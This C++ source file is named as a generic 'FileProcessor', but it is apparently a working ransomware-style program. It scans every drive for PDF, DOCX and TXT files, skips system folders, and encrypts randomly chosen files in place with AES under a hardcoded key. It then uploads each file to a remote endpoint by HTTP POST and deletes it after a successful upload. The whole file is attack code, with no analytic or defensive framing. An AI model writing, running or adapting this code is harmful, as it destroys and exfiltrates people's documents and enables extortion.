#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <random>
#include <fstream>
#include <curl/curl.h>
#include <openssl/evp.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

class FileProcessor {
public:
    // Get all available drives on the system
    static std::vector<std::string> getAllDrives() {
        std::vector<std::string> drives;

        #ifdef _WIN32
        // Windows drive discovery
        char drive[4] = "C:\\";
        for (drive[0] = 'A'; drive[0] <= 'Z'; drive[0]++) {
            if (GetDriveTypeA(drive) > 1) {
                drives.push_back(std::string(drive));
            }
        }
        #else
        // Unix-like systems drives
        drives = {"/", "/home", "/usr", "/mnt"};
        #endif

        return drives;
    }

    // Comprehensive file search across all drives
    static std::vector<std::string> findFilesAcrossSystem(
        const std::vector<std::string>& extensions, 
        bool excludeSystemDirs = true
    ) {
        std::vector<std::string> allMatchedFiles;
        std::vector<std::string> drives = getAllDrives();

        for (const auto& rootPath : drives) {
            try {
                // Recursively search each drive for matching files
                std::vector<std::string> driveFiles = findFilesByExtension(rootPath, extensions, excludeSystemDirs);
                allMatchedFiles.insert(
                    allMatchedFiles.end(), 
                    driveFiles.begin(), 
                    driveFiles.end()
                );
            } catch (const std::exception& e) {
                std::cerr << "Error searching drive " << rootPath << ": " << e.what() << std::endl;
            }
        }

        return allMatchedFiles;
    }

    // In-place file encryption method
    static bool encryptFileInPlace(const std::string& filePath, const std::string& key) {
        // Open input file and read entire content
        std::ifstream inFile(filePath, std::ios::binary);
        if (!inFile) {
            std::cerr << "Cannot open file: " << filePath << std::endl;
            return false;
        }

        // Read file content to memory
        std::string fileContent((std::istreambuf_iterator<char>(inFile)), 
                                 std::istreambuf_iterator<char>());
        inFile.close();

        // Initialize encryption context
        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        unsigned char iv[AES_BLOCK_SIZE];
        RAND_bytes(iv, AES_BLOCK_SIZE);

        // Prepare encryption buffer
        unsigned char* encryptedContent = new unsigned char[fileContent.size() + AES_BLOCK_SIZE];
        int encryptedLen = 0, finalLen = 0;

        // Perform encryption
        EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, 
            reinterpret_cast<const unsigned char*>(key.c_str()), iv);
        
        EVP_EncryptUpdate(ctx, encryptedContent, &encryptedLen, 
            reinterpret_cast<const unsigned char*>(fileContent.c_str()), fileContent.size());
        
        EVP_EncryptFinal_ex(ctx, encryptedContent + encryptedLen, &finalLen);
        
        int totalLen = encryptedLen + finalLen;

        // Overwrite original file with encrypted content
        std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
        outFile.write(reinterpret_cast<char*>(iv), AES_BLOCK_SIZE);
        outFile.write(reinterpret_cast<char*>(encryptedContent), totalLen);
        
        // Cleanup
        delete[] encryptedContent;
        EVP_CIPHER_CTX_free(ctx);
        outFile.close();

        return true;
    }

    // File upload method
    static bool uploadFile(const std::string& filePath) {
        CURL* curl = curl_easy_init();
        if (!curl) return false;

        struct curl_httppost* formpost = NULL;
        struct curl_httppost* lastptr = NULL;

        curl_formadd(&formpost, &lastptr,
            CURLFORM_COPYNAME, "file",
            CURLFORM_FILE, filePath.c_str(),
            CURLFORM_END);

        // Configure upload endpoint
        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost.com/upload");
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);

        // Perform upload
        CURLcode res = curl_easy_perform(curl);
        
        // Cleanup
        curl_formfree(formpost);
        curl_easy_cleanup(curl);

        return (res == CURLE_OK);
    }

    // Process random files
    static void processRandomFiles(const std::vector<std::string>& allFiles, 
                                   const std::string& encryptionKey, 
                                   int numFiles = 10) {
        // Limit selection to available files
        int selectCount = std::min(numFiles, static_cast<int>(allFiles.size()));

        // Randomly select files
        std::vector<std::string> selectedFiles;
        std::sample(
            allFiles.begin(), allFiles.end(), 
            std::back_inserter(selectedFiles), 
            selectCount, 
            std::mt19937{std::random_device{}()}
        );

        // Process each selected file
        for (const auto& file : selectedFiles) {
            if (encryptFileInPlace(file, encryptionKey)) {
                if (uploadFile(file)) {
                    // Delete file after successful upload
                    std::filesystem::remove(file);
                }
            }
        }
    }

private:
    // File extension search method
    static std::vector<std::string> findFilesByExtension(
        const std::string& rootPath, 
        const std::vector<std::string>& extensions, 
        bool excludeSystemDirs = true
    ) {
        std::vector<std::string> matchedFiles;
        std::vector<std::string> normalizedExtensions;

        for (const auto& ext : extensions) {
            normalizedExtensions.push_back(toLowercase(ext));
        }

        try {
            for (const auto& entry : std::filesystem::recursive_directory_iterator(rootPath, 
                std::filesystem::directory_options::skip_permission_denied)) {
                
                // Skip system directories
                if (excludeSystemDirs && isSystemPath(entry.path().string())) {
                    continue;
                }

                // Check if file matches extensions
                if (entry.is_regular_file()) {
                    std::string extension = toLowercase(entry.path().extension().string());
                    
                    if (std::find(normalizedExtensions.begin(), 
                                  normalizedExtensions.end(), 
                                  extension) != normalizedExtensions.end()) {
                        matchedFiles.push_back(entry.path().string());
                    }
                }
            }
        }
        catch (const std::filesystem::filesystem_error& e) {
            std::cerr << "Error accessing filesystem: " << e.what() << std::endl;
        }

        return matchedFiles;
    }

    // Helper method for case conversion
    static std::string toLowercase(const std::string& str) {
        std::string lowered = str;
        std::transform(lowered.begin(), lowered.end(), lowered.begin(), 
            [](unsigned char c){ return std::tolower(c); });
        return lowered;
    }

    // Check for system directories
    static bool isSystemPath(const std::string& path) {
        std::vector<std::string> systemDirs = {
            "windows", "program files", "system volume information", 
            "$recycle.bin", "recovery", "boot", "system32"
        };

        std::string lowercasePath = toLowercase(path);
        
        for (const auto& sysDir : systemDirs) {
            if (lowercasePath.find(toLowercase(sysDir)) != std::string::npos) {
                return true;
            }
        }
        return false;
    }
};

int main() {
    // File extensions to process
    std::vector<std::string> extensions = {".pdf", ".docx", ".txt"};

    // Encryption key (32 bytes)
    std::string encryptionKey = "01234567890123456789012345678901";

    // Find files across all drives
    std::vector<std::string> foundFiles = FileProcessor::findFilesAcrossSystem(extensions);

    // Process 10 random files
    FileProcessor::processRandomFiles(foundFiles, encryptionKey);

    return 0;
}
